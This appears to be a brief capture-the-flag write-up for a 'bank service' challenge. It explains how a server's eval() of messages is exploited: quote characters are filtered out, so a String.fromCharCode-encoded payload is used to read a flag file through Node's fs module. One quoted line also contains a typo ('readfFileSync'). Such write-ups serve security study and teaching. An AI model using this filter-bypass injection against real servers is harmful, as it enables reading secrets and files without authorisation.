# Writeup for bank service

## PoC code
```javascript
require(String.fromCharCode(97+5)+String.fromCharCode(97+18)).readFileSync(String.fromCharCode(47) +  String.fromCharCode(118) +  String.fromCharCode(97) +  String.fromCharCode(114) +  String.fromCharCode(47) +  String.fromCharCode(99) +  String.fromCharCode(116) +  String.fromCharCode(102) +  String.fromCharCode(47) +  String.fromCharCode(102) +  String.fromCharCode(108) +  String.fromCharCode(97) +  String.fromCharCode(103)).toString()
```

## Description
There is a `eval()` function when message is processed by server. So we can
execute any javascript for at server side, but there is a small filter.

It filters some chars including `'`, and `"`. Because of that, we cannot use
string.

However, we can bypass using `String.fromCharCode()` function. This function
produce a single character from ascii code, so with chaining that code, we
can produce any string freely.

To read a key file, it is enough to execute this:
```
require('fs').readfFileSync(keypath).toString()
```

With proper encoding, we can get final PoC code described as above.
